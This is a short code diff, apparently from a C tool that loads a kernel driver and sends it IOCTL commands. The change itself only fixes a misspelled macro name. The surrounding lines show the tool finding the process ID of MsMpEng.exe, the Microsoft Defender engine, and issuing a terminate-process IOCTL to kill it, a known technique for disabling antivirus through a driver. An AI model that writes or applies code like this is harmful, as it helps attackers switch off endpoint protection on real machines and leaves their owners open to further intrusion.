@@ -6,7 +6,7 @@
 
 #define INITIALIZE_IOCTL_CODE 0x9876C004
 
-#define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094
+#define TERMINATE_PROCESS_IOCTL_CODE 0x9876C094
 
 BOOL
 LoadDriver(
@@ -238,7 +238,7 @@ main(
         {
             if (input = GetPID(L"MsMpEng.exe"))
             {
-                if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL))
+                if (!DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL))
                 {
                     printf("DeviceIoControl failed. Error: %X !!\n", GetLastError());
                     CloseHandle(hDevice);
@@ -258,7 +258,7 @@ main(
 
     printf("terminating process !! \n");
 
-    result = DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
+    result = DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL);
 
     if (!result)
     {
